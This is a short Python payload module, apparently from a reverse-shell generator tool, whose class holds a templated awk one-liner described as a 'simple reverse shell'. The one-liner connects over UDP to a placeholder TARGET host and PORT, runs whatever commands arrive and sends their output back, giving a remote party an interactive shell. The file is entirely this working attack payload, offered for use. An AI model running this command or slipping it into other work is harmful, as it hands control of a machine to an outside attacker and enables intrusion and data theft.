class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple reverse shell using awk."
    function    = "reverse shell"
    liner       = """VAR1=PORT;awk -v VAR2="$VAR1" 'BEGIN{VAR3="/inet/udp/0/TARGET/"VAR2;while(NUM1){do{printf "shell>"|&VAR3;VAR3|& getline VAR4;if(VAR4){while((VAR4|& getline)>0)print $0|&VAR3;close(VAR4);}}while(VAR4!="exit")close(VAR3);break}}' /dev/null"""
